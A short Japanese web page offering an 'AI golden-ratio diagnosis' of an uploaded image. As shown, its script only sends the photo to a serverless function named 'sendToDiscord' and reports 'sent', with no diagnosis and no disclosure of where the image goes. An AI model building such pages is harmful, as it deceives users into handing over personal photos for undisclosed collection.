<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>AI黄金比診断</title>
<style>
body {
  background:#000;
  color:#fff;
  font-family:sans-serif;
}
button {
  padding:8px 16px;
}
</style>
</head>
<body>

<h1>AI黄金比診断</h1>

<input type="file" id="file" accept="image/*"><br><br>
<button onclick="send()">診断する</button>

<script>
async function send() {
  const file = document.getElementById("file").files[0];
  if (!file) return alert("画像選んで");

  const reader = new FileReader();
  reader.onload = async () => {
    const res = await fetch("/.netlify/functions/sendToDiscord", {
      method: "POST",
      body: JSON.stringify({ image: reader.result }),
    });

    if (res.ok) {
      alert("送信完了");
    } else {
      alert("エラー起きました");
    }
  };
  reader.readAsDataURL(file);
}
</script>

</body>
</html>
